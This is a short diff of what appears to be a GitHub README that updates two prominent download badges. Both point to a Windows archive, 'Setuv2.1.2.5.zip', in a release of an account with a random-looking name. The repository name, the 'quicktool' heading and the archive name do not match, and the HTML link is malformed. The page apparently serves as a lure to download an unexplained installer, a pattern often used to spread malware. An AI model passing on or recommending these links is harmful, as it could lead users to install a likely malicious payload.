@@ -1,6 +1,6 @@
-<a href="https://github.com/dmitry-miller-hq1999h8/gocli/releases/download/v3.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/GET-Windows%20Build-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download"></a>
+<a href="https://github.com/dmitry-miller-hq1999h8/gocli/releases/download/v4.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/GET-Windows%20Build-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download"></a>
 
-[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/dmitry-miller-hq1999h8/gocli/releases/download/v3.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/dmitry-miller-hq1999h8/gocli/releases/download/v4.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ quicktool
 
